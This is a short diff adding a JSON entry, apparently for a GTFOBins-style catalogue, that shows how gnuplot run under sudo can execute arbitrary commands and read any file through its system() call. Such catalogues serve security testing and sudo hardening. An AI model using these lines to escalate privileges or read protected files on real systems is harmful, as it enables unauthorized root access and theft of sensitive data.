@@ -1,0 +1,16 @@
+{
+  "functions": {
+    "sudo": [
+      {
+        "description": "",
+        "code": "COMMAND=id\nsudo gnuplot -e 'set print \"-\" ; print system(\"'$COMMAND'\")'\n"
+      }
+    ],
+    "file-read": [
+      {
+        "description": "",
+        "code": "LFILE=file_to_read\nsudo gnuplot -e 'set print \"-\" ; print system(\"cat '$LFILE'\")'\n"
+      }
+    ]
+  }
+}
